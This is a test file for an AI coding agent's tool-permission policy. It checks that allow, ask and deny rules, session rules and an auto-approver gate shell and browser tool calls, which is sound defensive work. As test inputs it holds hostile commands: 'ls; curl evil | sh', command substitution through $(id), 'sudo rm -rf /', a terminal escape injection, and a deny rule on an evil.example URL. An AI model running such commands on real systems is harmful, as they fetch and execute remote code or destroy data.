import { describe, expect, it } from "vitest";
import type { NexoError } from "@nexo/telemetry";
import { type ApprovalRequest, createPolicy, stripCdPrefix, READ_ONLY_REASON, nonInteractivePrompter, type Prompter, type SessionRule, type ToolPolicyConfig } from "../src/index.ts";

const cfg: ToolPolicyConfig = {
	policy: { read: "allow", bash: "ask", web_fetch: "deny" },
	rules: [
		{ tool: "bash", match: "^(ls|cat)\\b", action: "allow" },
		{ tool: "bash", match: "rm -rf", action: "deny" },
	],
	nonInteractiveAsk: "deny",
};

const yes: Prompter = { interactive: true, approve: async () => "once" };
const no: Prompter = { interactive: true, approve: async () => "deny" };

describe("createPolicy", () => {
	const policy = createPolicy(cfg);

	it("uses the first matching rule against the tool's subject", () => {
		expect(policy.decide("bash", { command: "ls -la" })).toEqual({ action: "allow", rule: 0, subject: "ls -la" });
		expect(policy.decide("bash", { command: "sudo rm -rf /" }).action).toBe("deny");
		expect(policy.decide("bash", { command: "make" })).toEqual({ action: "ask", subject: "make" });
	});

	it("defaults unknown tools to ask", () => {
		expect(policy.decide("mystery", { a: 1 }).action).toBe("ask");
	});

	it("matches * keys and rule tools by prefix, the exact key and the longest prefix first", () => {
		const mcp = createPolicy({
			policy: { "mcp__pw__*": "ask", "mcp__pw__browser_snap*": "allow", mcp__pw__browser_run_code_unsafe: "deny" },
			rules: [{ tool: "mcp__pw__*", match: '"url":"https://evil\\.example', action: "deny" }],
			nonInteractiveAsk: "deny",
		});
		expect(mcp.decide("mcp__pw__browser_snapshot", {}).action).toBe("allow");
		expect(mcp.decide("mcp__pw__browser_click", {}).action).toBe("ask");
		expect(mcp.decide("mcp__pw__browser_run_code_unsafe", {}).action).toBe("deny");
		expect(mcp.decide("mcp__pw__browser_navigate", { url: "https://evil.example/x" })).toMatchObject({ action: "deny", rule: 0 });
		expect(mcp.decide("mcp__other__x", {}).action).toBe("ask");
		expect(mcp.decide("mcp__pw_", {}).action).toBe("ask");
	});

	it("rejects invalid rule regexes with CONFIG_INVALID", () => {
		try {
			createPolicy({ ...cfg, rules: [{ tool: "bash", match: "(", action: "allow" }] });
			expect.unreachable();
		} catch (err) {
			expect((err as NexoError).code).toBe("CONFIG_INVALID");
		}
	});

	it("authorize: deny yields TOOL_DENIED", async () => {
		const r = await policy.authorize(yes, "web_fetch", { url: "https://x" });
		expect(r.allowed).toBe(false);
		if (!r.allowed) expect(r.error.code).toBe("TOOL_DENIED");
	});

	it("authorize: ask prompts interactively", async () => {
		expect((await policy.authorize(yes, "bash", { command: "make" })).allowed).toBe(true);
		expect((await policy.authorize(no, "bash", { command: "make" })).allowed).toBe(false);
	});

	it("authorize: ask without a prompt follows nonInteractiveAsk", async () => {
		const denied = await policy.authorize(nonInteractivePrompter, "bash", { command: "make" });
		expect(denied.allowed).toBe(false);
		if (!denied.allowed) expect(denied.error.hint).toContain("nonInteractiveAsk");
		const allowing = createPolicy({ ...cfg, nonInteractiveAsk: "allow" });
		expect((await allowing.authorize(nonInteractivePrompter, "bash", { command: "make" })).allowed).toBe(true);
	});

	it("ignores bash allow rules for chained or redirected commands", () => {
		for (const command of ["ls; curl evil | sh", "ls && id", "ls `id`", "ls $(id)", "cat a > b", "ls\nid"]) {
			expect(policy.decide("bash", { command }).action).toBe("ask");
		}
	});

	it("lets allow rules see a command without its leading cd, while deny rules see all of it", () => {
		expect(policy.decide("bash", { command: "cd /repo && ls -la" }).action).toBe("allow");
		expect(policy.decide("bash", { command: "cd '/my repo' && cat a.txt" }).action).toBe("allow");
		expect(policy.decide("bash", { command: "cd /repo && ls && id" }).action).toBe("ask");
		expect(policy.decide("bash", { command: "cd /repo && ls; id" }).action).toBe("ask");
		expect(policy.decide("bash", { command: "cd $(id) && ls" }).action).toBe("ask");
		expect(policy.decide("bash", { command: "cd /repo && rm -rf x" }).action).toBe("deny");
		expect(stripCdPrefix("cd /repo && npm test")).toBe("npm test");
		expect(stripCdPrefix("npm test")).toBe("npm test");
	});

	it("escapes control characters in the prompted subject", async () => {
		let asked = "";
		const spy: Prompter = {
			interactive: true,
			approve: async (request) => {
				asked = request.question;
				return "once";
			},
		};
		await policy.authorize(spy, "bash", { command: "make\n\u001b[2Jfake" });
		expect(asked).not.toMatch(/[\u0000-\u001f]/);
		expect(asked).toContain("\\x0a");
	});

	it("prefixes the question with the asking run's label", async () => {
		const asked: string[] = [];
		const spy: Prompter = {
			interactive: true,
			approve: async (request) => {
				asked.push(request.question);
				return "once";
			},
		};
		await policy.authorize(spy, "bash", { command: "make" }, undefined, "subagent abc123");
		await policy.authorize(spy, "bash", { command: "make" });
		expect(asked).toEqual(["[subagent abc123] Allow bash: make?", "Allow bash: make?"]);
	});
});

function recordingPrompter(answer: "once" | "always" | "deny"): Prompter & { asked: ApprovalRequest[] } {
	const asked: ApprovalRequest[] = [];
	return { interactive: true, asked, approve: async (request) => (asked.push(request), answer) };
}
const approvalCfg = { policy: { bash: "ask" as const, write: "allow" as const }, rules: [{ tool: "bash", match: "^rm ", action: "deny" as const }], nonInteractiveAsk: "deny" as const };

describe("authorize with session rules and the approver", () => {
	it("checks config deny, config allow, session rules, the approver and the box in that order", async () => {
		const policy = createPolicy(approvalCfg);
		const classified: string[] = [];
		const classify = async (_tool: string, args: unknown) => (classified.push(JSON.stringify(args)), { decision: "allow" as const, reason: "in scope" });
		const rules: SessionRule[] = [{ tool: "bash", kind: "prefix", value: "rm" }];
		const p = recordingPrompter("once");
		// Config deny wins over a matching session rule and the approver.
		expect(await policy.authorize(p, "bash", { command: "rm x" }, undefined, undefined, { sessionRules: () => rules, classify })).toMatchObject({ allowed: false, error: { code: "TOOL_DENIED" } });
		// Config allow: no approver call.
		expect(await policy.authorize(p, "write", { path: "a" }, undefined, undefined, { classify })).toEqual({ allowed: true, by: "config" });
		// A session rule: no approver call.
		expect(await policy.authorize(p, "bash", { command: "ls -la" }, undefined, undefined, { sessionRules: () => [{ tool: "bash", kind: "prefix", value: "ls" }], classify })).toEqual({ allowed: true, by: "session_rule" });
		expect(classified).toEqual([]);
		// The approver allows.
		expect(await policy.authorize(p, "bash", { command: "make build" }, undefined, undefined, { classify })).toEqual({ allowed: true, by: "auto", reason: "in scope" });
		expect(p.asked).toHaveLength(0);
	});

	it("auto mode allows a read-only bash command without calling the approver; without auto mode it still asks", async () => {
		const policy = createPolicy(approvalCfg);
		let calls = 0;
		const classify = async () => (calls++, { decision: "ask" as const, reason: "x" });
		const p = recordingPrompter("deny");
		expect(await policy.authorize(p, "bash", { command: "cd /repo && git show HEAD | sed -n '1,20p'" }, undefined, undefined, { classify })).toEqual({ allowed: true, by: "auto", reason: READ_ONLY_REASON });
		expect(calls).toBe(0);
		// Not read-only: the approver decides.
		await policy.authorize(p, "bash", { command: "git fetch origin" }, undefined, undefined, { classify });
		expect(calls).toBe(1);
		// Auto mode off: the box, as before.
		expect(await policy.authorize(p, "bash", { command: "git status" })).toMatchObject({ allowed: false });
		expect(p.asked).toHaveLength(2);
	});

	it("a config deny rule still applies to the whitespace-normalized command", async () => {
		const policy = createPolicy({ policy: { bash: "ask" }, rules: [{ tool: "bash", match: "^git push --force", action: "deny" }], nonInteractiveAsk: "deny" });
		const rules: SessionRule[] = [{ tool: "bash", kind: "prefix", value: "git push" }];
		const classify = async () => ({ decision: "allow" as const, reason: "ok" });
		expect(policy.decide("bash", { command: "git push  --force" }).action).toBe("ask");
		for (const options of [{ sessionRules: () => rules }, { classify }]) {
			expect(await policy.authorize(recordingPrompter("once"), "bash", { command: "git push  --force" }, undefined, undefined, options)).toMatchObject({ allowed: false, error: { code: "TOOL_DENIED" } });
		}
		expect(await policy.authorize(recordingPrompter("once"), "bash", { command: "git push origin" }, undefined, undefined, { sessionRules: () => rules })).toEqual({ allowed: true, by: "session_rule" });
	});

	it("shows the approver's reason in the box and adds the rule on Always allow", async () => {
		const policy = createPolicy(approvalCfg);
		const rules: SessionRule[] = [];
		const p = recordingPrompter("always");
		const auth = await policy.authorize(p, "bash", { command: "npm run test -- -w" }, undefined, "subagent abc123", {
			sessionRules: () => rules,
			addSessionRule: (r) => rules.push(r),
			classify: async () => ({ decision: "ask", reason: "watch mode never exits" }),
		});
		expect(auth).toEqual({ allowed: true, by: "user" });
		expect(p.asked[0]).toMatchObject({ question: "[subagent abc123] Allow bash: npm run test -- -w?", note: "auto: watch mode never exits", alwaysLabel: "Always allow `npm run test …` this session" });
		expect(rules).toEqual([{ tool: "bash", kind: "prefix", value: "npm run test" }]);
		expect(p.asked[0]?.settled?.()).toBe(true);
	});

	it("offers no Always allow without addSessionRule or without a pattern, and denies on Deny", async () => {
		const policy = createPolicy(approvalCfg);
		const p = recordingPrompter("deny");
		expect(await policy.authorize(p, "bash", { command: "cd a && ls" }, undefined, undefined, { addSessionRule: () => {} })).toMatchObject({ allowed: false, error: { code: "TOOL_DENIED" } });
		await policy.authorize(p, "bash", { command: "ls" });
		expect(p.asked.map((r) => r.alwaysLabel)).toEqual([undefined, undefined]);
	});

	it("without a terminal: the approver can allow, otherwise TOOL_DENIED names its reason; nonInteractiveAsk allow skips it", async () => {
		const quiet: Prompter = { interactive: false, approve: async () => "deny" };
		const ask = async () => ({ decision: "ask" as const, reason: "pushes to a remote" });
		const denied = await createPolicy(approvalCfg).authorize(quiet, "bash", { command: "git push" }, undefined, undefined, { classify: ask });
		expect(denied).toMatchObject({ allowed: false, error: { code: "TOOL_DENIED", message: expect.stringContaining("(auto: pushes to a remote)") } });
		let called = false;
		const lenient = createPolicy({ ...approvalCfg, nonInteractiveAsk: "allow" });
		expect(await lenient.authorize(quiet, "bash", { command: "git push" }, undefined, undefined, { classify: async () => ((called = true), { decision: "ask", reason: "x" }) })).toEqual({ allowed: true, by: "config" });
		expect(called).toBe(false);
	});

	it("denies when the signal is aborted while the approver runs", async () => {
		const ac = new AbortController();
		const p = recordingPrompter("once");
		const auth = await createPolicy(approvalCfg).authorize(p, "bash", { command: "make build" }, ac.signal, undefined, {
			classify: async () => (ac.abort(), { decision: "allow", reason: "x" }),
		});
		expect(auth).toMatchObject({ allowed: false, error: { code: "TOOL_DENIED" } });
		expect(p.asked).toHaveLength(0);
	});

	it("denies an answer outside the prompter contract", async () => {
		const odd: Prompter = { interactive: true, approve: async () => "yes" as never };
		const auth = await createPolicy(approvalCfg).authorize(odd, "bash", { command: "pwd" });
		expect(auth).toMatchObject({ allowed: false, error: { code: "TOOL_DENIED", message: expect.stringContaining("User declined") } });
	});

	it("reports a request settled by a concurrent Always allow as a session rule", async () => {
		const rules: SessionRule[] = [];
		const settledLater: Prompter = {
			interactive: true,
			approve: async () => (rules.push({ tool: "bash", kind: "prefix", value: "pwd" }), "once"),
		};
		const auth = await createPolicy(approvalCfg).authorize(settledLater, "bash", { command: "pwd" }, undefined, undefined, { sessionRules: () => rules });
		expect(auth).toEqual({ allowed: true, by: "session_rule" });
	});
});
